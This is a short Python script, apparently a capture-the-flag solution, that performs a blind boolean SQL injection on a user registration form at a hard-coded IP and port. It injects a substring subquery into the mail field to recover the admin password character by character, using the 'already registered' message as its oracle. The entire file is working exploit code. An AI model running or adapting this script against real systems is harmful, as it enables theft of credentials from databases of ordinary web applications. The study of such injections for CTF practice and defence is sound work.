import string
import random
import requests

if __name__ == "__main__":
    allchars = string.ascii_letters + string.ascii_uppercase + string.digits + '$'
    passwd = 'test'
    mail = 'test@qq.com' + "' and substr((select passwd from users where username='admin'),{},1)='{}"
    password = ''
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    for i in range(1, 30):
        for c in allchars:
            ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 12))
            data = {
                'username': ran_str,
                'passwd': passwd,
                'mail':  mail.format(i, c)
            }
            req = requests.post('http://61.147.171.105:56869/user/register/', headers = headers, data = data, proxies = {'http': 'http://127.0.0.1:8080'})
            if 'User or Mail Already Registered' in req.text:
                password = password + c
                print(password)
                break
            
        if c == '$':
            print('finish')
            break